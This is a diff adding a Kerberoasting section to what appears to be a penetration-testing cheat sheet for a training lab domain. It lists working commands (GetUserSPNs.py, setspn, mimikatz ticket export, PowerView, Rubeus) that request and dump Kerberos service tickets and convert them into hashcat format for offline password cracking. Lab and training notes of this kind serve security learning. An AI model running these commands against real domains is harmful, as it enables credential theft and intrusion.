@@ -297,8 +297,50 @@ dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountContro
 ```
 
 ## Kerberoasting
+### Linux
 ```bash
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
 
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+```
+
+### Windows
+#### Manual
+```
+setspn.exe -Q */*
+
+Add-Type -AssemblyName System.IdentityModel
+
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+
+mimikatz # base64 /out:true
+
+mimikatz # kerberos::list /export
+```
+```bash
+echo "<base64 blob>" |  tr -d \\n
+
+cat encoded_file | base64 -d > sqldev.kirbi
+
+python2.7 kirbi2john.py sqldev.kirbi
+
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+```
+
+#### Newer
+```powershell
+Import-Module .\PowerView.ps1
+
+Get-DomainUser * -spn | select samaccountname
+
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+```powershell
+.\Rubeus.exe kerberoast /stats
+
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 ```
